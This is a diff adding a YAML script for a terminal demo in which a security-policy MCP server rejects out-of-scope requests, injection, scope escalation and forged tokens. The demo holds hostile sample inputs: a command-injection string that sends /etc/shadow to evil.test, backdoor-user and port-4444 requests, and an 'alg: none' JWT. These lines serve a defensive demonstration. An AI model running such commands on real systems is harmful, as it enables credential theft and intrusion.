@@ -1,0 +1,198 @@
+settings:
+  title: "Act 10 — Containment Boundary"
+  width: 100
+  height: 35
+  prompt: "[root@idm ~]# "
+  type_speed: 0.03
+
+instructions:
+  - type: comment
+    text: "enforcement-mcp only manages security policy — nothing else exists"
+    pause_after: 1.5
+
+  - type: marker
+    label: "Tool inventory"
+
+  - type: command
+    run: "enforce-mcp --list-tools | head -30"
+    output: |
+      DIAGNOSE (13 tools):
+        check_selinux_enabled    avc_denials
+        boolean_list             file_context_query
+        policy_query             host_posture
+        denial_explain           troubleshoot
+        mls_range_query          mls_context_check
+        aide_check               aide_status
+        fapolicyd_status
+
+      REMEDIATE (11 tools):
+        set_boolean              restore_context
+        load_module              generate_module
+        add_file_context         mls_set_range
+        aide_init                aide_update
+        fapolicyd_add_rule       fapolicyd_reload
+        generate_playbook
+
+      Total: 24 tools — SELinux, fapolicyd, MLS, AIDE only
+    pause_after: 2.5
+
+  - type: marker
+    label: "Out-of-scope requests"
+
+  - type: comment
+    text: "Alice (full access) tries operations outside enforcement-mcp's domain"
+    pause_after: 1.0
+
+  - type: command
+    run: "enforce-mcp --user alice useradd backdoor-user"
+    output: |
+      ERROR: unknown tool 'useradd'
+        enforcement-mcp manages: SELinux, fapolicyd, MLS, AIDE
+        Not a security policy operation — request rejected
+        Available tools: enforce-mcp --list-tools
+    pause_after: 2.0
+
+  - type: command
+    run: "enforce-mcp --user alice firewall-cmd --add-port=4444/tcp"
+    output: |
+      ERROR: unknown tool 'firewall-cmd'
+        enforcement-mcp manages: SELinux, fapolicyd, MLS, AIDE
+        Network configuration is outside scope — request rejected
+    pause_after: 2.0
+
+  - type: command
+    run: "enforce-mcp --user alice dnf install nmap"
+    output: |
+      ERROR: unknown tool 'dnf'
+        enforcement-mcp manages: SELinux, fapolicyd, MLS, AIDE
+        Package management is outside scope — request rejected
+    pause_after: 2.0
+
+  - type: command
+    run: "enforce-mcp --user alice cat /etc/shadow"
+    output: |
+      ERROR: unknown tool 'cat'
+        enforcement-mcp manages: SELinux, fapolicyd, MLS, AIDE
+        Arbitrary file read is outside scope — request rejected
+    pause_after: 2.0
+
+  - type: marker
+    label: "Injection resistance"
+
+  - type: comment
+    text: "Prompt injection attempt — tool name is a lookup, not a shell"
+    pause_after: 1.0
+
+  - type: command
+    run: |-
+      enforce-mcp --user alice \
+        "set_boolean; curl http://evil.test/exfil?data=$(cat /etc/shadow)"
+    output: |
+      ERROR: unknown tool 'set_boolean; curl http://evil.test/exfil...'
+        Tool dispatch is enum match, not shell exec
+        Input parsed as tool name — no command injection possible
+        Attempted payload treated as literal string lookup
+    pause_after: 2.5
+
+  - type: comment
+    text: "No shell. No eval. Fixed tool dispatch — injection is a type error"
+    pause_after: 1.5
+
+  - type: marker
+    label: "Scope escalation"
+
+  - type: comment
+    text: "Even sovereign OBO tokens cannot expand enforcement-mcp's tool set"
+    pause_after: 1.0
+
+  - type: command
+    run: |-
+      ahdapa-cli obo-exchange --subject alice \
+        --target enforcement-mcp \
+        --scope "enforce-diagnose enforce-remediate admin"
+    output: |
+      ERROR: scope ceiling exceeded
+        Requested: enforce-diagnose enforce-remediate admin
+        Allowed:   enforce-diagnose enforce-remediate
+        Scope 'admin' not in agent's scope ceiling
+        Token exchange rejected (RFC 8693 Section 4.3)
+    pause_after: 2.5
+
+  - type: marker
+    label: "Caller validation"
+
+  - type: comment
+    text: "enforcement-mcp validates WHO is calling, not just WHAT they ask"
+    pause_after: 1.0
+
+  - type: comment
+    text: "Approved agent: sovereign-agent with valid OBO token"
+    pause_after: 0.8
+
+  - type: command
+    run: "enforce-mcp --token $SOVEREIGN_TOKEN check_selinux_enabled"
+    output: |
+      agent: sovereign-agent (aa199a47-...)
+      issuer: https://idm.demo.agentic.test/idp
+      signature: ES256 — verified against JWKS
+      HBAC rule: sovereign-full-access — match
+      ALLOWED: check_selinux_enabled
+    pause_after: 1.5
+
+  - type: comment
+    text: "Untrusted agent — not in any enforcement HBAC rule"
+    pause_after: 0.8
+
+  - type: command
+    run: "enforce-mcp --token $UNTRUSTED_TOKEN check_selinux_enabled"
+    output: |
+      agent: untrusted-agent (0eb6ff28-...)
+      issuer: https://idm.demo.agentic.test/idp
+      signature: ES256 — verified
+      DENIED: agent not in any enforcement HBAC rule
+        No rule grants enforce-diagnose to this agent
+        Token is valid but agent is not authorized
+    pause_after: 2.0
+
+  - type: comment
+    text: "Forged token — not issued by ahdapa"
+    pause_after: 0.8
+
+  - type: command
+    run: "enforce-mcp --token eyJhbGciOiJub25lIn0.eyJzdWIiOiJoYWNrZXIifQ. check_selinux_enabled"
+    output: |
+      REJECTED: token signature verification failed
+        Algorithm 'none' not accepted
+        Only ES256/ES384/ML-DSA accepted via JWKS
+        Token not issued by trusted IdP — connection refused
+    pause_after: 2.5
+
+  - type: comment
+    text: "Three checks: valid signature + trusted issuer + HBAC agent match"
+    pause_after: 1.5
+
+  - type: marker
+    label: "Boundary proof"
+
+  - type: comment
+    text: "Four layers of containment — who, what, where, and how much"
+    pause_after: 1.0
+
+  - type: command
+    run: "cat /opt/demo/boundary-matrix.txt"
+    output: |
+      Check              Layer         Result
+      ---------          --------      ------
+      sovereign agent    Caller        ALLOWED (HBAC match)
+      untrusted agent    Caller        REJECTED (no HBAC rule)
+      forged token       Caller        REJECTED (bad signature)
+      set_boolean        Tool          ALLOWED (in inventory)
+      useradd            Tool          REJECTED (no such tool)
+      cmd; injection     Tool          REJECTED (type error)
+      scope: admin       Scope         REJECTED (ceiling)
+      alice on client    Host          REJECTED (HBAC narrows)
+    pause_after: 3.0
+
+  - type: comment
+    text: "Four layers: caller identity + tool inventory + scope ceiling + host HBAC"
+    pause_after: 2.0
